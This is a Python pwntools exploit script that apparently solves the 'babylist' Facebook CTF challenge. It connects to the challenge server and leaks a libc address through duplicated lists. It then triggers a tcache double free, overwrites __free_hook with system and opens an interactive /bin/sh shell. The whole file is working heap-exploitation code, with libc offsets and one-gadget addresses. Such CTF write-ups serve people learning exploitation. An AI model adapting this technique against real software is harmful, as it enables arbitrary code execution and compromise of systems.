from pwn import *
from pwn_debug.pwn_debug import *
context.log_level = 'debug'

TARGET = "babylist"
LIBC = "./libc-2.27.so"
elf = ELF(TARGET)
libc = ELF(LIBC) 

HOST = 'challenges3.fbctf.com'
PORT = 1343

pdbg = pwn_debug(TARGET)
pdbg.local(LIBC) 
# r = pdbg.run("local")
r = remote(HOST, PORT)

# bp, fork-mode, command
# pdbg.bp([0x199a], 'child', ['c'])

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def create(name):
    r.sendline('1')
    r.sendlineafter('name for list:', name)
    r.recvuntil('>')

def add(index, number):
    r.sendline('2')
    r.sendlineafter('index of list:', str(index))
    r.sendlineafter('number to add:', str(number))
    r.recvuntil('>')

def view(index, list_index):
    r.sendline('3')
    r.sendlineafter('index of list:', str(index))
    r.sendlineafter('index into list:', str(list_index))
    ret = r.recvuntil('>')
    return ret

def dupli(index, name):
    r.sendline('4')
    r.sendlineafter('index of list:', str(index))
    r.sendlineafter('for new list:', str(name))
    r.recvuntil('>')

def delete(index):
    r.sendline('5')
    r.sendlineafter('index of list:', str(index))
    r.recvuntil('>')

r.recvuntil('>')

create("A")
for i in range(0x80*4):
    add(0, 1)
dupli(0, "B") 
add(0, 1)

v1 = int(view(1, 0).split(' = ')[1].split('\n')[0]) & 0xffffffff
v2 = int(view(1, 1).split(' = ')[1].split('\n')[0])

leak = v2 << 32 | v1
# base = leak - 0xd2aca0
base = leak - 0x3ebca0
dbg("leak")
dbg("base")
malloc_hook = base + 0x3ebc30
free_hook = base + 0x3ed8e8
system = base + 0x4f440
binsh = base + 0x1b3e9a

gadget = [
0x4f2c5, # execve("/bin/sh", rsp+0x40, environ)
0x4f322, # execve("/bin/sh", rsp+0x40, environ)
0x10a38c # execve("/bin/sh", rsp+0x70, environ)
]
# add(1, 1) # cause double free yay!
debug = base + gadget[0]
dbg("debug")
# pause()

create("C"* 4)
for i in range(0x8*4):
    add(2, 1)
dupli(2, "D") 

create("E")
for i in range(0x8*4):
    add(4, 1)

# trigger double free
add(2, 1)
add(4, 1)
add(3, 1)


create(p64(free_hook))
create("dummy1")
create("dummy2")
# create(p64(base + gadget[1]))
create(p64(system))

# r.sendline('5')
# r.sendlineafter('index of list:', '1')
create("shell")
add(9, u32('/bin'))
add(9, u32('/sh\00'))

r.sendline('2')
r.sendlineafter('index of list:', str(9))
r.sendlineafter('number to add:', str(1))


r.interactive()
